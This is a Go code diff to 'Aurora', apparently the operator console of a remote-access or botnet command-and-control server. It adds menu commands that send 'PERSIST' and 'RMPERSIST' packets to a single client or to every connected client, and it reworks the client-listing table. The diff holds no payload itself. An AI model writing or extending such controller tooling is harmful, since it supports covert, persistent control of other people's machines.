@@ -96,10 +96,38 @@ func (aurora *Aurora) handleCommands() {
 			aurora.pingClient()
 		case "2":
 			if len(inArray) >= 2 {
-				index, _ := strconv.Atoi(inArray[1])
-				aurora.removeClient(index)
+				index, err := strconv.Atoi(inArray[1])
+				if err != nil {
+					aurora.removeClient(-1)
+				} else {
+					aurora.removeClient(index)
+				}
+			} else {
+				aurora.removeClient(-1)
 			}
 		case "3":
+			if len(inArray) >= 2 {
+				index, err := strconv.Atoi(inArray[1])
+				if err != nil {
+					aurora.addClientPersist(-1)
+				} else {
+					aurora.addClientPersist(index)
+				}
+			} else {
+				aurora.addClientPersist(-1)
+			}
+		case "4":
+			if len(inArray) >= 2 {
+				index, err := strconv.Atoi(inArray[1])
+				if err != nil {
+					aurora.removeClientPersist(-1)
+				} else {
+					aurora.removeClientPersist(index)
+				}
+			} else {
+				aurora.removeClientPersist(-1)
+			}
+		case "5":
 			clearScreen()
 			os.Exit(0)
 		default:
@@ -150,19 +178,26 @@ func (aurora *Aurora) pingClient() {
 	}
 	printLogo()
 	// TODO Fix this shitty layout.
+	var i int
 	for index, client := range aurora.clients.All() {
-		str := "| " + strconv.Itoa(index) + " | " + client.GetConn().RemoteAddr().String() + " |"
-		for i := 0; i < len(str); i++ {
-			if i == 0 || i == len(str)-1 {
+		ip := client.GetConn().RemoteAddr().String()
+		ip = strings.Split(ip, ":")[0]
+		str := "| " + strconv.Itoa(index) + " | " + ip
+		for i = 0; i < 27; i++ {
+			if i == 0 || i == 4 || i == 26 {
 				fmt.Print("+")
 			} else {
 				fmt.Print("-")
 			}
 		}
 		fmt.Println()
-		fmt.Println(str)
+		fmt.Print(str)
+		for i := len(str); i < 26; i++ {
+			fmt.Print(" ")
+		}
+		fmt.Println("|")
 	}
-	fmt.Println("+-------------------------+")
+	fmt.Println("+---+---------------------+")
 	fmt.Println("| Press Enter To Continue |")
 	fmt.Println("+-------------------------+")
 	aurora.getInput()
@@ -170,7 +205,7 @@ func (aurora *Aurora) pingClient() {
 
 func (aurora *Aurora) removeClient(index int) {
 
-	if aurora.clients.Get(index) != (Client{}) {
+	if index != -1 && aurora.clients.Get(index) != (Client{}) {
 		cl := aurora.clients.Get(index)
 		enc := cl.GetEncoder()
 		err := enc.Encode(Packet{"REMOVE", "", 0, nil, false})
@@ -178,14 +213,100 @@ func (aurora *Aurora) removeClient(index int) {
 		if err != nil {
 			fmt.Println(err)
 		}
+		printLogo()
+		fmt.Println("+-------------------------+")
+		fmt.Println("|   Connection Removed    |")
+		fmt.Println("| Press Enter To Continue |")
+		fmt.Println("+-------------------------+")
+		aurora.getInput()
+	} else {
+		printLogo()
+		fmt.Println("+-------------------------+")
+		fmt.Println("|  Connection Not Found   |")
+		fmt.Println("| Press Enter To Continue |")
+		fmt.Println("+-------------------------+")
+		aurora.getInput()
 	}
+}
 
-	printLogo()
-	fmt.Println("+-------------------------+")
-	fmt.Println("|   Connection Removed    |")
-	fmt.Println("| Press Enter To Continue |")
-	fmt.Println("+-------------------------+")
-	aurora.getInput()
+func (aurora *Aurora) addClientPersist(index int) {
+	if index == -99 {
+		for _, client := range aurora.clients.All() {
+			enc := client.GetEncoder()
+			err := enc.Encode(Packet{"PERSIST", "", 0, nil, false})
+			if err != nil {
+				fmt.Println(err)
+				aurora.removeConnection(client.GetConn())
+			}
+			printLogo()
+			fmt.Println("+-------------------------+")
+			fmt.Println("|    Persistence Added    |")
+			fmt.Println("| Press Enter To Continue |")
+			fmt.Println("+-------------------------+")
+			aurora.getInput()
+		}
+	} else if index != -1 && aurora.clients.Get(index) != (Client{}) {
+		cl := aurora.clients.Get(index)
+		enc := cl.GetEncoder()
+		err := enc.Encode(Packet{"PERSIST", "", 0, nil, false})
+		if err != nil {
+			fmt.Println(err)
+			aurora.removeConnection(cl.GetConn())
+		}
+		printLogo()
+		fmt.Println("+-------------------------+")
+		fmt.Println("|    Persistence Added    |")
+		fmt.Println("| Press Enter To Continue |")
+		fmt.Println("+-------------------------+")
+		aurora.getInput()
+	} else {
+		printLogo()
+		fmt.Println("+-------------------------+")
+		fmt.Println("|  Connection Not Found   |")
+		fmt.Println("| Press Enter To Continue |")
+		fmt.Println("+-------------------------+")
+		aurora.getInput()
+	}
+}
+
+func (aurora *Aurora) removeClientPersist(index int) {
+	if index == -99 {
+		for _, client := range aurora.clients.All() {
+			enc := client.GetEncoder()
+			err := enc.Encode(Packet{"RMPERSIST", "", 0, nil, false})
+			if err != nil {
+				fmt.Println(err)
+				aurora.removeConnection(client.GetConn())
+			}
+			printLogo()
+			fmt.Println("+-------------------------+")
+			fmt.Println("|   Persistence Removed   |")
+			fmt.Println("| Press Enter To Continue |")
+			fmt.Println("+-------------------------+")
+			aurora.getInput()
+		}
+	} else if index != -1 && aurora.clients.Get(index) != (Client{}) {
+		cl := aurora.clients.Get(index)
+		enc := cl.GetEncoder()
+		err := enc.Encode(Packet{"RMPERSIST", "", 0, nil, false})
+		if err != nil {
+			fmt.Println(err)
+			aurora.removeConnection(cl.GetConn())
+		}
+		printLogo()
+		fmt.Println("+-------------------------+")
+		fmt.Println("|   Persistence Removed   |")
+		fmt.Println("| Press Enter To Continue |")
+		fmt.Println("+-------------------------+")
+		aurora.getInput()
+	} else {
+		printLogo()
+		fmt.Println("+-------------------------+")
+		fmt.Println("|  Connection Not Found   |")
+		fmt.Println("| Press Enter To Continue |")
+		fmt.Println("+-------------------------+")
+		aurora.getInput()
+	}
 }
 
 // Menu Layout
@@ -209,13 +330,15 @@ func printLogo() {
 
 func printMenu() {
 	printLogo()
-	fmt.Println("+------------+")
-	fmt.Println("| Commands   |")
-	fmt.Println("+------------+")
-	fmt.Println("| 1 | Ping   |")
-	fmt.Println("| 2 | Remove |")
-	fmt.Println("| 3 | Exit   |")
-	fmt.Println("+------------+")
+	fmt.Println("+-------------+")
+	fmt.Println("| Commands    |")
+	fmt.Println("+---+---------+")
+	fmt.Println("| 1 | Ping    |")
+	fmt.Println("| 2 | Remove  |")
+	fmt.Println("| 3 | Persist |")
+	fmt.Println("| 4 | Rm Prst |")
+	fmt.Println("| 5 | Exit    |")
+	fmt.Println("+---+---------+")
 	fmt.Print("\nEnter Command: ")
 }
 
